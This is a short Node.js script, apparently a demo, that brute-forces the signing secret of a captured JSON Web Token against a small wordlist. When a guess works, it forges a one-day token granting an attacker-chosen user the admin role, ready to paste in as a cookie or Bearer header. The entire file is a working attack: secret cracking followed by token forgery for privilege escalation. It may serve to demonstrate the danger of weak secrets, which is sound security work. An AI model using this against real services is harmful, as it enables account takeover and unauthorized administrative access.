const jwt = require("jsonwebtoken");

const wordlist = ["123456", "password", "admin", "secret", "greenroot", "letmein"];

const capturedToken = process.argv[2];

if (!capturedToken) {
    console.log("Usage: node jwt-weak-secret-demo.js <captured-authToken-value>");
    process.exit(1);
}

console.log("Attempting to crack JWT secret...\n");

for (const candidate of wordlist) {
    try {
        const payload = jwt.verify(capturedToken, candidate);
        console.log(`CRACKED! Secret is: "${candidate}"`);
        console.log("Decoded payload:", payload);

        const forgedToken = jwt.sign({ userId: "attacker-controlled-id", role: "admin" }, candidate, {
            expiresIn: "1d",
        });
        console.log("\nForged admin token (usable as authToken cookie / Bearer header):");
        console.log(forgedToken);
        process.exit(0);
    } catch (err) {
    }
}

console.log("Secret not found in wordlist.");
